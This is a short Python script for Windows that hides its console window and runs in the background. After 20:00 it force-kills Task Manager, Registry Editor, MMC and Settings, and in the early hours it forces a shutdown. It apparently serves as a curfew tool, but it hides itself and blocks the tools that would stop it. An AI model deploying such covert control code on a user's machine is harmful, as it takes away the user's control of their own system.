import datetime
import time
import os
import threading
import subprocess

# import to hide the cmd when its run
import ctypes
import win32gui, win32con

data = ['']


def update():
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName' # creating the cmd script var
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE) # Executing the script
    for i in proc.stdout:
        if not i.decode()[0].isspace():
            data.append(i.decode().rstrip()) # Append the data

def background():
    while True:
        cTime = int(datetime.datetime.now().hour)
        time.sleep(1)

        if cTime >= 20:
            update()
            if 'Taskmgr' in data:
                os.system("TASKKILL /F /IM Taskmgr.exe")
            if 'regedit' in data:
                os.system("TASKKILL /F /IM regedit.exe")
            if 'mmc' in data:
                os.system("TASKKILL /F /IM mmc.exe")
            if 'ApplicationFrameHost' in data:
                os.system("TASKKILL /F /IM SystemSettings.exe")
            data.clear()

        if cTime <= 6:
            print("Shuting down")
            time.sleep(1)
            os.system("shutdown /s /t 1")

if __name__ == "__main__":
    
    # Hiding cmd and making it completely background app
    hide = win32gui.GetForegroundWindow()
    ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 6 )
    win32gui.ShowWindow(hide , win32con.SW_HIDE)

    # Running the thread
    threading.Thread(name='background', target=background).start()